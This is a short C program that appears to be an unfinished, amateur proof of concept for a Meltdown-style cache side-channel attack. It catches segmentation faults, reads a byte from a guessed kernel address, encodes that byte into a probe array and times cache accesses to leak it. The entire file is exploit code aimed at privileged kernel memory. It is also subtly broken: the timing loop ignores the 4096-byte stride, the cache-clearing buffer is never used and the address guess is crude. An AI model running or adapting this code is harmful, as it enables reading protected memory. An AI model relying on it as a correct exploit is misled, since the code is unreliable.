#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/time.h>
#include <time.h>
//if you read array much larger than the l3 cache it should clear everything except that array

#define GB *1073741824
jmp_buf buf;
uint8_t kernel_memory = 0;

void signal_manager(int sig) {
    if (sig == SIGSEGV) {
	longjmp(buf, 1);
    }
}



int main() {
	
    unsigned int num;

    signal(SIGSEGV, signal_manager);

    // uint*_t should be one byte big
    uint8_t* probe_array = malloc(256 * 4096 * sizeof(uint8_t));

    
    // get a kernel address
    void* task_size = ((((unsigned long)&num) + 1 GB) / (1 GB)) GB; 
    if (task_size == NULL) { return 2; }
    

    // CLEAR CACHE
    void *clearer = calloc(8, 1024*1024); // 8 MB

    if (!setjmp(buf)) {
	kernel_memory = *(uint8_t*)(task_size);
    	uint64_t final_kernel_memory = kernel_memory * 4096; // 4096 is page size?
    	uint8_t dummy = probe_array[final_kernel_memory];
    }

    // cache timing part
    struct timespec stop, start;
    int i;
    for (i=0; i<256; i++) {    
	clock_gettime(CLOCK_REALTIME, &start);
	probe_array[i];
	clock_gettime(CLOCK_REALTIME, &stop);
	printf("took %lu\n", stop.tv_nsec - start.tv_nsec);
    }

    return 0;
}

